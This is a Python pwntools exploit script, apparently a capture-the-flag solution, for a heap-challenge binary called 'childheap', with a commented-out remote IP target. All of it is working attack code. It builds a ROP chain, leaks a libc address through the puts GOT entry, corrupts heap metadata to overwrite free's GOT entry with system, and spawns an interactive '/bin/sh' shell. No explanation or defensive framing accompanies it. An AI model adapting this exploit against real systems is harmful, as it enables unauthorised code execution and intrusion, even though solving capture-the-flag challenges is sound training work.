from pwn import *

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

p = process('./childheap')
# p = remote("52.78.27.112", 10001)

leaveret = 0x400c7e
puts_plt = 0x400730
puts_got = 0x602020
free_got = 0x602018

age_addr = 0x6020c0
code_addr = 0x6020b0

leaveret = 0x400c7e
pop_rdi = 0x400d83   # pop rdi ; ret ;
pop_rsi = 0x400d81   # pop rsi ; pop r15 ; ret ;
modify_addr = 0x400b23

puts_offset = 0x6f690
system_offset = 0x45390

# gdb.attach(p)

DEBUG = True

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def s(msg, enter = True):
  msg = msg + "\n" if enter else msg
  p.send(msg)
  if DEBUG:
    log.info("Sent: " + msg)

def alloc(size, data):
  r("> ")
  s("1")

  r("size: ")
  s(str(size))

  r("data: ")
  s(data, False)

def free():
  r("> ")
  s("2")

def secret(code, comment = ""):
  r("> ")
  s("201527")

  r("code: ")
  s(str(code))

  if code == 1397048149:
    r("comment: ")
    s(comment, False)

def modify(name, change_name = False, change_age = False, age = 0):
  r("> ")
  s("3")

  r("(y/n)? ")
  s("y" if change_age else "n")
  if change_age:
    r("age: ")
    s(str(age))

  r("name: ")
  s(name)

  r("(y/n)? ")
  s("y" if change_name else "n")

size = 4095

rop_chain = "A" * 0x78
rop_chain += p64(pop_rdi)
rop_chain += p64(puts_got)
rop_chain += p64(puts_plt)
rop_chain += p64(modify_addr)
rop_chain += p64(pop_rdi)
rop_chain += p64(age_addr + 8)
rop_chain += p64(puts_plt)
rop_chain = rop_chain.ljust(0x400, "\x00")

alloc(size, "A" * (size-1))
secret(1397048149, rop_chain)

secret(0x211)
free()

modify("B" * 8)
free()

payload = "a" * 8
payload += p64(age_addr - 0x10)

modify(payload)

alloc(size, "B" * (size-1))

payload = "\x00" * 8
payload += p64(age_addr - 0x18)
payload += p64(age_addr - 0x18)

modify(payload, True)
free()

payload = p64(0)
payload += p64(free_got - 0x8)
payload += "/bin/sh\x00"

alloc(512, payload)

payload = p64(leaveret)
payload += p64(puts_plt + 6)

modify(payload)
modify(payload, True)

free()

leak_str = r("\n")[:6]
puts_leak = u64(leak_str.ljust(8, "\x00"))
libc_base = puts_leak - puts_offset

print "[*] puts_leak: 0x%x" % puts_leak
print "[*] libc_base: 0x%x" % libc_base

system_addr = libc_base + system_offset

payload = p64(system_addr) * 2

r("(y/n)? ")
s("n")

r("name: ")
s(payload)

r("(y/n)? ")
s("y")

p.interactive()
p.close()
